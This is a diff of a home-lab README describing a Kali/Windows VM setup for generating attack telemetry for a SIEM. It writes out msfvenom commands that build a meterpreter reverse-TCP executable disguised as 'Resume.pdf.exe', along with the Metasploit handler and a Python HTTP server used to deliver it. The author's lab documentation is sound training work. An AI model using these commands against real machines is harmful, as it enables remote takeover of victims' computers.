@@ -2,7 +2,7 @@
 
 ## Objective
 
-The Home Lab Setup project is aimed to establish a controlled environment for simulating and detecting cyber attacks and test various cybersecurity tools. I set up a home lab using two virtual machines using VMWare as the hypervisor. My host machine is a MacBook Pro M2 Max. VMs also allow the ability conduct these tests in a controlled environment without causing harm to the host machine.
+The Home Lab Setup & SIEM Implementation project is aimed to establish a controlled environment for simulating and detecting cyber attacks and to test various cybersecurity tools. I set up a home lab using two virtual machines using VMWare as the hypervisor. My host machine is a MacBook Pro M2 Max. VMs also allow the ability conduct these tests in a controlled environment without causing harm to the host machine.
 
 The primary focus of this lab was to set up a test environment and to ingest and analyze logs within a Security Information and Event Management (SIEM) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen my understanding of network security, attack patterns, and defensive strategies. 
 
@@ -26,7 +26,7 @@ The primary focus of this lab was to set up a test environment and to ingest and
 ## Steps
 <img width="768" alt="image" src="https://github.com/user-attachments/assets/5d058a4f-3784-4298-9337-c96dcbb0e91b" />
 
-In the screenshot above, I show the two VMs I created and have hosted in VMWare. I installed Kali Linux for ARM architectures as well as Windows 11 ARM since the host machine I am on is an Apple MacBook Pro with the M2 Max CPU. Each of the VMs are configured with 4GB of RAM, 50GB HDD space, as well as 2 CPUs (processor cores). The two VMs are on the same network as administered by VMWare & the host machine through NAT. This way, both VMs can see the other VM. The IP addresses of both VMs will need to be statically assigned so that each VM will be able to see the other one.
+In the screenshot above, I show the two VMs I created and hosted in VMWare. I installed Kali Linux for ARM architectures as well as Windows 11 ARM since the host machine I am on is an Apple MacBook Pro with the M2 Max CPU. Each of the VMs are configured with 4GB of RAM, 50GB storage space, as well as 2 CPUs (processor cores). The two VMs are on the same network as administered by VMWare & the host machine through NAT. This way, both VMs can see one another. The IP addresses of both VMs will need to be statically assigned so that each VM will be able to see the other one.
 
 <img width="768" alt="image" src="https://github.com/user-attachments/assets/fa283314-1bfe-4920-885b-64ea3354d7ee" />
 
@@ -50,39 +50,39 @@ In the Windows VM, I type ping 192.168.20.11 in Command Prompt to ping the Kali 
 
 <img width="2560" alt="3 1" src="https://github.com/user-attachments/assets/7187ec61-80d8-46eb-9932-d1f504b16ba2" />
 
-Next, I took note of the IP address of my Kali Linux machine that will be used in building the malware. The IP address can be obtained by typing ifconfig in the Terminal. 
+Next, I took note of the IP address of my Kali Linux machine that will be used in building the malware. The IP address is obtained by typing ifconfig in the Terminal. 
 
 <img width="2560" alt="3 2" src="https://github.com/user-attachments/assets/93217f8f-4614-4328-8981-ff8641c57938" />
 
-Next, in the Terminal, I type nmap -A 192.168.20.10 -Pn. My Windows machine is on the IP address ending in .10. Nmap will scan all the ports and will scan them. -Pn skips pings. After Nmap runs, the results return showing that port 3389 for RDP is open on the Windows machine.
+Next, in the Terminal, I type nmap -A 192.168.20.10 -Pn. My Windows machine is on the IP address ending in .10. Nmap scans all the ports and will scan them. -Pn skips pings. After Nmap runs, the results return showing that port 3389 for RDP is open on the Windows machine.
 
 <img width="2560" alt="3 3" src="https://github.com/user-attachments/assets/bfebb106-9f86-4644-9846-7b72e4f4c066" />
 
-In Terminal, I then typed msfvenom -l payloads to view the list of midterpreters that can be used as the payload. The one I selected is windows/x64/meterpreter_reverse_tcp
+In Terminal, I type msfvenom -l payloads to view the list of midterpreters that can be used as the payload. The one I selected is windows/x64/meterpreter_reverse_tcp.
 
 <img width="2560" alt="3 4" src="https://github.com/user-attachments/assets/ddf263fa-85cb-4dd8-84b8-b9e731191f88" />
 
-Next, in Terminal, I typed msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe. This command will generate malware using meterpreter’s reverse TCP payload which is instructed to connect back to a machine based on the L host and L port. The file format will be an .exe format as specified and the file name will be Resume.pdf.exe.
+Next, in Terminal, I type msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe. This command generates malware using meterpreter’s reverse TCP payload which is instructed to connect back to a machine based on the L host and L port. The file format is an .exe format as specified and the file name will be Resume.pdf.exe.
 
 <img width="2560" alt="3 5" src="https://github.com/user-attachments/assets/6f223fdd-72e6-472e-94cf-243cd94815a9" />
 
-After running the command, I typed ls in Terminal to verify that the file has been created.
+After running the command, I type ls in Terminal to verify that the file has been created by printing out the contents of the current directory.
 
 <img width="2560" alt="3 6" src="https://github.com/user-attachments/assets/6db034ed-3a62-4d46-b722-108df800d888" />
 
-Metasploit is then opened by typing msfconsole in Terminal. The multihandler is used by then typing use exploit/multi/handler. This then allows the user to be in the exploit itself.
+Metasploit is opened by typing msfconsole in Terminal. The multihandler is used by typing use exploit/multi/handler. This allows the user to be in the exploit itself.
 
 <img width="2560" alt="3 7" src="https://github.com/user-attachments/assets/bc9597fb-2158-406a-bf29-6246c5813286" />
 
-In Terminal, I typed options to see what can be configured. The payload option is currently generic/shell_reverse_tcp. This will be changed so that it is the same payload as used when the malware is configured and msfvenom. To change the payload, I type set payload windows/x64/meterpreter/reverse_tcp.
+In Terminal, I type options to see what can be configured. The payload option is currently generic/shell_reverse_tcp. This is changed so that it is the same payload as used when the malware is configured and msfvenom. To change the payload, I type set payload windows/x64/meterpreter/reverse_tcp.
 
 <img width="2560" alt="3 8" src="https://github.com/user-attachments/assets/9f5c6dc5-ed52-4183-a733-a97d6f68e10e" />
 
-I typed options in Terminal again to verify that the payload option was changed to Windows x64 meterpreter reverse TCP. 
+I type options in Terminal again to verify that the payload option was changed to Windows x64 meterpreter reverse TCP. 
 
 <img width="2560" alt="3 9" src="https://github.com/user-attachments/assets/675e6ad2-a77c-4321-927b-da3f1579baa1" />
 
-Afterwards, the LHOST should be changed to the attacker machine which is the IP address of the Kali Linux machine. I type set lhost 192.168.20.11 in Terminal. Afterwards, I type options to verify that the change took place
+Afterwards, the LHOST should is changed to the attacker machine which is the IP address of the Kali Linux machine. I type set lhost 192.168.20.11 in Terminal. Afterwards, I type options to verify that the change took place.
 
 <img width="2560" alt="3 10" src="https://github.com/user-attachments/assets/bf37c294-d86b-4a9c-b6a5-ab77f3072ce0" />
 
@@ -90,7 +90,7 @@ Next, in Terminal, I typed exploit to start the handler and so that we can liste
 
 <img width="2516" alt="3 11" src="https://github.com/user-attachments/assets/c7cf07b6-7bbd-4aad-9034-7e4845546ff5" />
 
-Next, I set up an HTTP server on the Kali Linux machine so the test Windows machine can download the malware. I use Python to execute the command. In Terminal, I type python3 -m http.server 9999. I chose the port that is not in use, which in this case is 9999. This will allow the Windows machine to access the Kali Linux machine in order to download the malware file.
+Next, I set up an HTTP server on the Kali Linux machine so the test Windows machine can download the malware. I use Python to execute the command. In Terminal, I type python3 -m http.server 9999. I chose a port that is not in use, which in this case is 9999. This allows the Windows machine to access the Kali Linux machine in order to download the malware file.
 
 <img width="2560" alt="3 12" src="https://github.com/user-attachments/assets/07ddb9ed-2874-4d6d-8af5-67551ecbe866" />
 
